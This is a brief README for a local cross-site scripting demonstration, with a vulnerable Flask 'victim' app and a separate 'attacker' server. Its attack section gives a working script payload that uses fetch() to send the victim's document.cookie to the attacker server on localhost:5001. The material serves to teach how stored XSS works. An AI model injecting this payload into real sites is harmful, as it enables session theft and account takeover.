# Cross-Site Scripting Example

## Setup

Install needed dependencies:

```sh
python -m pip install flask flask-cors
```

Run the victim app:

```sh
python victim.py
```

You can input something in the text field and press "Submit".
You will then be redirected to `http://localhost:5000/search?query=$QUERY`.

## The Attack

Start the attacker server:

```sh
python attacker.py
```

Exploit it by going to `localhost:5000` as the attacker and inserting this comment:

```
<script>fetch(`http://localhost:5001/steal-cookie?cookie=${document.cookie}`)</script>
```

Now load `localhost:5000` as the victim (e.g. on another browser) and observe that your cookies will be stolen.
